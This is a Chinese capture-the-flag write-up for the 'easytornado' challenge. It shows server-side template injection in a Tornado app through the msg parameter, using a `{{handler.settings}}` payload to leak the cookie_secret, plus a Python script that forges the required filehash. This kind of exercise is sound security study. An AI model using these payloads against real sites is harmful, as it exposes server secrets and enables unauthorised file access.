## D5 T1 easytornado

利用Tornado框架写的

猜是模板注入

访问hint.txt

提示flag in /fllllllllllllag

访问发现报错

但是很明显这个msg参数是有问题的

```text
payload=/error?msg={{3}}
```

返回一个3

但是试了加法乘法都不行

查一查Tornado的模板注入

这时候就要学会阅读源码

hint里不是让我们去找cookie_secret吗

在Tornado的auth.py

从第360行起有

```python
        request_cookie = handler.get_cookie("_oauth_request_token")
        if not request_cookie:
            raise AuthError("Missing OAuth request token cookie")
        handler.clear_cookie("_oauth_request_token")
        cookie_key, cookie_secret = [
            base64.b64decode(escape.utf8(i)) for i in request_cookie.split("|")
        ]
        if cookie_key != request_key:
            raise AuthError("Request token does not match cookie")
        token = dict(
            key=cookie_key, secret=cookie_secret
        )  # type: Dict[str, Union[str, bytes]]
```

关键在这个handler

查一下handler的属性，发现了settings

```python
    def _oauth_consumer_token(self) -> Dict[str, Any]:
        handler = cast(RequestHandler, self)
        handler.require_setting("twitter_consumer_key", "Twitter OAuth")
        handler.require_setting("twitter_consumer_secret", "Twitter OAuth")
        return dict(
            key=handler.settings["twitter_consumer_key"],
            secret=handler.settings["twitter_consumer_secret"],
        )
```

利用模板注入读一下handler.settings试试

```text
http://111.198.29.45:56392/error?msg={{handler.settings}}
{'autoreload': True, 'compiled_template_cache': False, 'cookie_secret': '20a6dd59-a17c-48bb-8ab9-e265a9391413'}
```

果然返回了cookie_secret

猜测filehash值就是hint里的

md5(cookie_secret+md5(filename))

跑一下脚本得到payload

```python
#coding=utf-8
import hashlib

def md5(str):
    md5 = hashlib.md5()
    md5.update(str.encode())
    return md5.hexdigest()
cookie_secret = '20a6dd59-a17c-48bb-8ab9-e265a9391413'
filename = '/fllllllllllllag'

print md5(cookie_secret+md5(filename))
```